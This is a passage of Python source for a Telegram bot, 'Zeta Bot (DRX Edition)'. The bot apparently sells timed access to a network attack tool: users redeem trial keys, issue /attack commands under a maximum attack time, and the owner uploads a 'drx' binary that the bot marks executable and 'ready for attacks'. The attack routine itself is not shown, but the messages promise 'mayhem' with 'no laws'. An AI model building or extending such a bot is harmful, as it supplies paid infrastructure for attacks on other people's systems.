{EMOJI['user']} Your ID: {user_id}

{EMOJI['crown']} Contact @YOWAI_MO_456 for a new key.""", parse_mode="Markdown")
            conn.close()
            return
        
        if uses_remaining <= 0:
            send_message(chat_id, f"""{EMOJI['cross']} KEY EXPIRED {EMOJI['cross']}

┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃  This trial key has reached    ┃
┃  its maximum uses ({max_uses})     ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛

{EMOJI['crown']} Contact @YOWAI_MO_456 for a new key.""")
            conn.close()
            return
        
        c.execute("INSERT INTO key_redemptions (key_code, user_id, redeemed_at) VALUES (?, ?, ?)",
                  (key_code, user_id, datetime.now().isoformat()))
        c.execute("UPDATE trial_keys SET uses_remaining = uses_remaining - 1 WHERE key_code = ?", (key_code,))
        
        expiry_date = datetime.now() + timedelta(hours=hours)
        expiry_str = expiry_date.isoformat()
        c.execute("INSERT OR REPLACE INTO users (user_id, approved_until, approved_by, is_trial) VALUES (?, ?, ?, ?)",
                  (user_id, expiry_str, ADMIN_ID, 1))
        
        conn.commit()
        c.execute("SELECT uses_remaining FROM trial_keys WHERE key_code = ?", (key_code,))
        new_uses = c.fetchone()[0]
        conn.close()
        
        days_display = round(hours / 24, 1)
        send_message(chat_id, f"""{EMOJI['gift']}{EMOJI['check']}{EMOJI['sparkles']} TRIAL ACCESS GRANTED {EMOJI['sparkles']}{EMOJI['check']}{EMOJI['gift']}

┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃  ✅ Welcome to Zeta Realm! ✅  ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛

{EMOJI['key']} 🔑 Key: `{key_code}`
{EMOJI['clock']} ⏰ Valid for: {days_display} days ({hours} hours)
{EMOJI['user']} 👤 Your ID: {user_id}
{EMOJI['lock']} 🔒 Uses left for this key: {new_uses}/{max_uses}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{EMOJI['repeat']} 🔁 You cannot redeem this same key again.
{EMOJI['bolt']} ⚡ Type /attack to begin your mayhem.
{EMOJI['skull']} 💀 No laws. No mercy. Total annihilation.
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

{EMOJI['crown']} — Alpha (@YOWAI_MO_456)""", parse_mode="Markdown")
        return
    
    conn.close()
    send_message(chat_id, f"{EMOJI['cross']} Invalid key, Alpha. {EMOJI['skull']}")

def handle_file_upload(chat_id, user_id, file_obj):
    """Auto-detect and handle any file upload as binary"""
    if user_id != ADMIN_ID:
        send_message(chat_id, f"{EMOJI['cross']} Only Alpha can upload files.")
        return
    
    file_name = file_obj.file_name
    
    try:
        file_info = requests.get(f"{API_URL}/getFile", params={"file_id": file_obj.file_id}).json()
        file_path = file_info["result"]["file_path"]
        file_url = f"https://api.telegram.org/file/bot{BOT_TOKEN}/{file_path}"
        
        response = requests.get(file_url)
        
        with open(BINARY_NAME, 'wb') as f:
            f.write(response.content)
        
        os.chmod(BINARY_NAME, 0o755)
        
        send_message(chat_id, f"""{EMOJI['check']}{EMOJI['rocket']} BINARY UPLOADED & AUTO-CONFIGURED {EMOJI['rocket']}{EMOJI['check']}

━━━━━━━━━━━━━━━━━━━━━━
{EMOJI['tools']} File: {BINARY_NAME}
{EMOJI['shield']} Permissions: 755 (chmod +x applied)
{EMOJI['bolt']} Status: READY FOR ATTACKS
━━━━━━━━━━━━━━━━━━━━━━

{EMOJI['skull']} Zeta is now armed. {EMOJI['skull']}
{EMOJI['crown']} — Alpha (@YOWAI_MO_456)""")
    except Exception as e:
        send_message(chat_id, f"{EMOJI['cross']} Upload failed: {str(e)}")

def process_updates():
    global LAST_UPDATE_ID
    try:
        resp = requests.get(f"{API_URL}/getUpdates", params={"offset": LAST_UPDATE_ID + 1, "timeout": 30}, timeout=35)
        data = resp.json()
        if not data.get("ok"):
            return
        for update in data.get("result", []):
            LAST_UPDATE_ID = update["update_id"]
            msg = update.get("message")
            if not msg:
                continue
            
            chat_id = msg["chat"]["id"]
            user_id = msg["from"]["id"]
            first_name = msg["from"].get("first_name", "")
            
            # AUTO HANDLE ANY FILE UPLOAD (no /upbin needed)
            if msg.get("document"):
                handle_file_upload(chat_id, user_id, msg["document"])
                continue
            
            if "text" not in msg:
                continue
            
            text = msg["text"].strip()
            if not text.startswith("/"):
                continue
            parts = text.split()
            raw_cmd = parts[0].lower()
            args = parts[1:] if len(parts) > 1 else []
            if '@' in raw_cmd:
                cmd = raw_cmd.split('@')[0]
            else:
                cmd = raw_cmd
            
            if cmd == "/start":
                handle_start(chat_id, user_id, first_name)
            elif cmd == "/help":
                handle_help(chat_id, user_id)
            elif cmd == "/status":
                handle_status(chat_id, user_id)
            elif cmd == "/myinfo":
                handle_myinfo(chat_id, user_id)
            elif cmd == "/attack":
                handle_attack(chat_id, user_id, args)
            elif cmd == "/yes":
                handle_yes(chat_id, user_id)
            elif cmd == "/redeem":
                handle_redeem(chat_id, user_id, args)
            elif cmd == "/maintenance":
                handle_maintenance(chat_id, user_id, args)
            elif cmd == "/setmaxtime":
                handle_setmaxtime(chat_id, user_id, args)
            elif cmd == "/approve" and user_id == ADMIN_ID:
                handle_approve(chat_id, user_id, args)
            elif cmd == "/genkey" and user_id == ADMIN_ID:
                handle_genkey(chat_id, user_id, args)
            elif cmd == "/gentrialkey" and user_id == ADMIN_ID:
                handle_gentrialkey(chat_id, user_id, args)
            elif cmd == "/broadcast" and user_id == ADMIN_ID:
                handle_broadcast(chat_id, user_id, args)
            elif cmd in ["/approve", "/genkey", "/gentrialkey", "/broadcast", "/setmaxtime"]:
                send_message(chat_id, f"{EMOJI['cross']} Only Alpha (@YOWAI_MO_456) can use this command. {EMOJI['crown']}")
            else:
                send_message(chat_id, f"{EMOJI['cross']} Unknown command. Type /help for the dark arts. {EMOJI['skull']}")
    except Exception as e:
        print(f"Polling error: {e}")

def main():
    print_banner()
    
    if check_and_fix_binary():
        print(f"\n{EMOJI['check']} DRX binary found and ready! {EMOJI['rocket']}")
    else:
        print(f"\n{EMOJI['warning']} DRX binary not found!")
        print(f"{EMOJI['info']} Simply send the drx file as a document in Telegram - bot will auto-detect and apply chmod +x")
        print(f"{EMOJI['tools']} Or manually place 'drx' in this directory and run: chmod +x drx")
    
    print(f"\n{EMOJI['check']} Zeta Bot v4.0 (DRX Edition) is LIVE, Alpha!")
    print(f"{EMOJI['alien']} Owner: @YOWAI_MO_456 (ID: {ADMIN_ID})")
    print(f"{EMOJI['shield']} Security: OWNER LOCK ENABLED")
    print(f"{EMOJI['tools']} Maintenance Mode: {'ON' if MAINTENANCE_MODE else 'OFF'}")
    print(f"{EMOJI['gem']} Max Attack Time: {MAX_ATTACK_TIME}s")
    print(f"{EMOJI['upload']} Auto-binary upload: Send any file as document")
    print(f"{EMOJI['alien']} Listening for commands... {EMOJI['alien']}\n")
    
    while True:
        try:
            process_updates()
        except Exception as e:
            print(f"Error: {e}")
            time.sleep(5)

if __name__ == "__main__":
    main()